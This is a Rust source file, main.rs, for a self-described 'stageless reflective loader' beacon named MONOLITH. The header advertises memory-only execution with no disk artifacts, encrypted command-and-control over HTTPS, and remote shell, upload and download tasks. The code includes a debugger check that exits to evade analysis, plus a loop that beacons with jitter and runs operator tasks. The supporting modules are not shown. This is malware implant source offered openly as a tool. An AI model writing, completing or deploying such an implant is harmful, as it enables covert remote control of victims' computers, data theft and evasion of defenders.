//! MONOLITH Native Agent - Stageless Reflective Loader
//!
//! Minimal memory-only beacon written in Rust.
//! Features:
//! - Reflective loader (no disk artifacts)
//! - Encrypted C2 over HTTPS
//! - Configurable sleep + jitter
//! - Task execution (shell, upload, download, etc.)
//!
//! Build: cargo build --release
//! Output: target/release/monolith-agent.exe

#![warn(clippy::all)]
#![allow(unused)]

mod beacon;
mod crypto;
mod loader;
mod syscall;

use beacon::Beacon;
use crypto::CryptoEngine;
use loader::ReflectiveLoader;
use std::env;
use std::time::Duration;

fn main() {
    // Anti-analysis: check for debuggers, sandboxes
    if is_debugged() {
        std::process::exit(0);
    }

    // Parse environment-based configuration
    let c2_url = env::var("MONOLITH_C2_URL")
        .unwrap_or_else(|_| "https://127.0.0.1:8080/c2/beacon".to_string());

    let sleep_secs = env::var("MONOLITH_SLEEP")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(60);

    let jitter_percent = env::var("MONOLITH_JITTER")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(30);

    // Initialize crypto
    let crypto = CryptoEngine::new();

    // Initialize beacon
    let mut beacon = Beacon::new(c2_url, crypto, sleep_secs, jitter_percent);

    // Main beacon loop
    loop {
        if let Err(e) = beacon.checkin() {
            eprintln!("[!] Checkin failed: {}", e);
        }

        if let Some(task) = beacon.poll_task() {
            if let Err(e) = beacon.execute_task(task) {
                eprintln!("[!] Task execution failed: {}", e);
            }
        }

        // Sleep with jitter
        let sleep_dur = beacon.jittered_sleep();
        std::thread::sleep(sleep_dur);
    }
}

fn is_debugged() -> bool {
    #[cfg(windows)]
    {
        use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
        unsafe { IsDebuggerPresent().as_bool() }
    }
    #[cfg(not(windows))]
    {
        let _ = env::var("MONOLITH_NO_ANTIDEBUG");
        false
    }
}
